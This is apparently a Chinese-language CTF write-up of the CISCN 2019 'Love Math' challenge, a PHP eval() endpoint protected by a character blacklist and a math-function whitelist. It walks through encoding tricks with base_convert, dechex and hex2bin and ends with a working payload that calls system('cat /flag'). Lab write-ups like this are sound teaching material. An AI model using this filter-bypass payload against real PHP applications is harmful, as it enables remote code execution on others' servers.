### [CISCN 2019 初赛]Love Math

> 参考：https://fushuling.com/index.php/2022/03/18/187/

----

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

- 限制了传入参数的长度
- 存在黑名单过滤

思路就是利用各种函数，构造`$content`，使他能够执行`eval('echo '.$content.';');`，我们得观察白名单上有啥

学习到几种函数

1. `base_convert()`

```php
$binaryNumber = "1010";
$decimalNumber = base_convert($binaryNumber, 2, 10); // 10
echo $decimalNumber; // 输出 10
```

- **number**：要转换的数字，通常以字符串形式提供。
- **frombase**：数字当前的进制（比如 2 为二进制，10 为十进制，16 为十六进制等）。
- **tobase**：要将数字转换成的目标进制。

2. `dechex()`

函数用于将十进制数转换为十六进制数。它接受一个十进制数值作为参数，并返回一个表示该数值的十六进制字符串。

```php
$Number = 255;
$hexNumber = dechex($Number);
echo $hexNumber; // 输出 ff
```

3. `hex2bin()`

`hex2bin()` 是 PHP 中的一个内置函数，用于将十六进制字符串转换为二进制字符串（实际上是二进制数据表示的字符串）

```php
$String = "48656C6C6F20576F726C64";
$binaryString = hex2bin($String);
echo $binaryString; // 输出 Hello World
```



Payload:

```php
echo base_convert(37907361743,10,36)."\n";
echo hex2bin("5f474554")."\n";
echo dechex(1598506324);
/*
hex2bin
_GET
5f474554   */
```

最终：

```php
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi{pi})($$pi{abs})&pi=system&abs=cat /flag
----->
?c=($_GET[pi])($_GET[abs])&pi=system&abs=cat/flag
```



### 总结

总结：主要获得了一个新思路，当题目给我们白名单的时候，我们就要思考通过什么合适的方式绕过，这题主要是使用的编码的巧妙绕过，和构造payload

